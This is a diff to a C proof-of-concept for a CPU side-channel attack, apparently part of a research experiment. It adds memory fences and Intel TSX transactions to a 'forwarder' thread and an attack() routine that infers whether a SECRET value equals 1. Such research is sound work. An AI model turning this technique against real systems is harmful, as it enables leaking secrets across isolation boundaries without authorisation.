@@ -1,6 +1,8 @@
 #include <stdio.h>
 #include <pthread.h>
 #include <stdbool.h>
+#include <stdatomic.h>
+#include <immintrin.h>  // TSX
 
 static int x;
 static int y;
@@ -66,8 +68,10 @@ void __attribute__((noinline)) attackfunc() {
 static bool attack() {
   x = 0;
   z = 0;
+  atomic_thread_fence(memory_order_seq_cst);
   volatile int* volatile_y = &y;  // volatile alias so we actually continuously reload & check
   while(*volatile_y);  // wait for forwarder to set y == 0
+  atomic_thread_fence(memory_order_seq_cst);
   attackfunc();
   // If z is 1 at this point we know that SECRET is not 1.
   return (z == 1);
@@ -79,16 +83,17 @@ static void* forwarder(void* dummy) {
   volatile int* volatile_y = &y;
 
   // copy x into y, forever
+  unsigned status;
   while(!forwarder_exit) {
-    // do this several times per iteration so we don't check forwarder_exit all the time
-    //*volatile_y = *volatile_x;
-    //*volatile_y = *volatile_x;
-    //*volatile_y = *volatile_x;
-    //*volatile_y = *volatile_x;
-    //*volatile_y = *volatile_x;
-    //*volatile_y = *volatile_x;
-    //*volatile_y = *volatile_x;
-    *volatile_y = *volatile_x;
+    status = _xbegin();
+    if(status == _XBEGIN_STARTED) {
+      // transaction successfully started
+      *volatile_y = *volatile_x;
+      _xend();
+    } else {
+      // transaction aborted
+      // just go back to top and retry
+    }
   }
 }
 
